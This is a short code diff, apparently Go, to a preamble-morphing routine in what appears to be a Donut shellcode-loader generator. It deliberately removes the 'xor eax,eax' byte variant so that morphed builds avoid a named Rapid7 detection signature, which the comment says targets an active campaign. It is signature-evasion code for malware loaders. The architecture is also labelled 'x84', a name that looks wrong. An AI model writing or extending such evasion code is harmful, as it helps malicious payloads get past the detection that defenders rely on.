@@ -128,13 +128,14 @@ func morphPreamble(arch DonutArch) ([]byte, error) {
 		return []byte{0x5A, 0x51, 0x52}, nil
 
 	case X84:
-		// The x84 mode-switch preamble starts with zeroing EAX.
-		// Three equivalent ways to zero a 32-bit register:
-		//   xor eax, eax  →  31 C0  (2 bytes, clears flags)
-		//   sub eax, eax  →  29 C0  (2 bytes, clears flags)
-		//   and eax, 0    →  83 E0 00 (3 bytes, clears flags)
+		// The x84 mode-switch preamble starts with zeroing EAX. Two safe
+		// non-canonical forms are used — the canonical `xor eax,eax` (31 C0)
+		// is deliberately EXCLUDED: the Rapid7 donut_loader_shellcode rule
+		// (2026-02, active campaign) keys on { 59 31 C0 48 0F } at the entry
+		// sandwich, so every morphed build must avoid that byte sequence.
+		//   sub eax, eax  →  29 C0  (2 bytes)
+		//   and eax, 0    →  83 E0 00 (3 bytes)
 		variants := [][]byte{
-			{0x31, 0xC0},       // xor eax, eax
 			{0x29, 0xC0},       // sub eax, eax
 			{0x83, 0xE0, 0x00}, // and eax, 0
 		}
